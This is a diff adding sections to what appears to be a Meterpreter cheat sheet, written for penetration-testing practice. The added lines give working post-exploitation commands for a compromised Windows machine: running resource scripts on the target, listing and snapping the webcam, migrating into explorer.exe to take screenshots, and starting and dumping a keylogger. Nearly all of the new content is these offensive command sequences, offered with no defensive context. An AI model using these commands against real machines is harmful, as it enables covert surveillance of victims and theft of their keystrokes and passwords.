@@ -166,6 +166,7 @@ meterpreter > cd # move
 meterpreter > pwd # path to current folder
 meterpreter > cat file # print file
 meterpreter > edit file # open file in vim
+meterpreter > exit
 ```
 
 And there are quite a lof of useful "post" modules
@@ -191,6 +192,58 @@ meterpreter > search -f pattern from* # ... inside given directories
 meterpreter > download c:\\path # download to your machine
 meterpreter > upload local_file c:\\path # upload
 ```
+
+<details class="details-e mt-4">
+<summary>Load a file with commands</summary>
+
+You can use resources to load a resource on the target
+
+```bash
+meterpreter > lpwd
+# local path
+meterpreter > lcd path
+# move to path (local)
+meterpreter > resource file.txt # with commands inside
+```
+</details>
+
+<details class="details-e">
+<summary>Take control of the webcam</summary>
+
+```bash
+meterpreter > webcam_list
+meterpreter > webcam_snap
+```
+</details>
+
+<details class="details-e">
+<summary>Take a screenshot</summary>
+
+```bash
+meterpreter > ps # find explorer.exe
+[...]
+1908 1284  explorer.exe [...]
+[...]
+meterpreter > migrate 1908
+meterpreter > use espia
+meterpreter > screengrab
+```
+</details>
+
+<details class="details-e">
+<summary>Install a key logger</summary>
+
+```bash
+meterpreter > ps # find explorer.exe
+[...]
+1908 1284  explorer.exe [...]
+[...]
+meterpreter > migrate 1908
+meterpreter > keyscan_start # start
+meterpreter > keyscan_dump # dump keys
+```
+</details>
+
 </div></div>
 
 <hr class="sr">
